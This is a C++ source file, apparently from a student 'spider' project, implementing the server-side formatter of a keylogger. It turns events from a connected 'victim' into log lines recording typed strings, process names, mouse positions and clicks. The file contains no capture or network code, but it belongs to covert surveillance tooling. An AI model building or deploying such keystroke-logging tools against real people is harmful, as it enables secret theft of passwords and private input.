/*
** EventBeautifuler.cpp for cpp_spider in /home/guillobits/Projects/epitech/tek3/cpp_spider/src/server/EventBeautifuler.cpp
**
** Made by Guillaume CAUCHOIS
** Login   <guillaume.cauchois@epitech.eu>
**
** Started on  Mon Oct 02 14:43:01 2017 Guillaume CAUCHOIS
** Last update Mon Oct 02 14:43:01 2017 Guillaume CAUCHOIS
*/

#include "EventBeautifuler.hpp"

EventBeautifuler::EventBeautifuler()
{
  this->_beautifuler[EventType::START_CONNECTION] = std::bind(
    &EventBeautifuler::eventBeautifulerStartConnection,
    this,
    std::placeholders::_1
  );
  this->_beautifuler[EventType::KEY_PRESSED] = std::bind(
    &EventBeautifuler::eventBeautifulerKeyPressed,
    this,
    std::placeholders::_1
  );
  this->_beautifuler[EventType::MOUSE_POSITION] = std::bind(
    &EventBeautifuler::eventBeautifulerMousePosition,
    this,
    std::placeholders::_1
  );
  this->_beautifuler[EventType::MOUSE_CLICK] = std::bind(
    &EventBeautifuler::eventBeautifulerMouseClick,
    this,
    std::placeholders::_1
  );
  this->_beautifuler[EventType::STOP_CONNECTION] = std::bind(
    &EventBeautifuler::eventBeautifulerStopConnection,
    this,
    std::placeholders::_1
  );
}

EventBeautifuler::~EventBeautifuler() = default;

const std::string EventBeautifuler::process(const Event &event)
{
  if (this->_beautifuler.find(event.getType()) == this->_beautifuler.end())
    return "";
  return this->_beautifuler[event.getType()](event);
}

const std::string EventBeautifuler::eventBeautifulerStartConnection(const Event &event) const
{
  std::stringstream	ss;

  ss << "[" << event.getTimestamp() << "][CLIENT "<< 0 << "] ";
  ss << "A new victim just connect" << std::endl;
  return ss.str();
}

const std::string EventBeautifuler::eventBeautifulerKeyPressed(const Event &event) const
{
  std::stringstream	ss;

  ss << "[" << event.getTimestamp() << "][CLIENT "<< 0 << "][";
  ss << event.getProcess().getProcessusName()<< " / ";
  ss << event.getProcess().getId()  << "] ";
  ss << "Réception de la chaine \"" << event.getBuffer() << "\"" << std::endl;
  return ss.str();
}

const std::string EventBeautifuler::eventBeautifulerMousePosition(const Event &event) const
{
  std::stringstream	ss;

  ss << "[" << event.getTimestamp() << "][CLIENT "<< 0 << "][";
  ss << event.getProcess().getProcessusName()<< " / ";
  ss << event.getProcess().getId()  << "] ";
  ss << "A sa souris à la position X:";
  ss << event.getPosition().getX() << " Y:";
  ss << event.getPosition().getY() << std::endl;
  return ss.str();
}

const std::string EventBeautifuler::eventBeautifulerMouseClick(const Event &event) const
{
  std::stringstream	ss;
  MouseButton		mouseButton;

  ss << "[" << event.getTimestamp() << "][CLIENT "<< 0 << "][";
  ss << event.getProcess().getProcessusName()<< " / ";
  ss << event.getProcess().getId()  << "] ";
  ss << "A utilisé les boutons suivants \"";
  ss << mouseButton.MouseVectorButtonTypeToString(event.getMouseButton());
  ss << "\"" << std::endl;
  return ss.str();
}

const std::string EventBeautifuler::eventBeautifulerStopConnection(const Event &event) const
{
  std::stringstream	ss;

  ss << "[" << event.getTimestamp() << "][CLIENT "<< 0 << "] ";
  ss << "Connection terminated" << std::endl;
  return ss.str();
}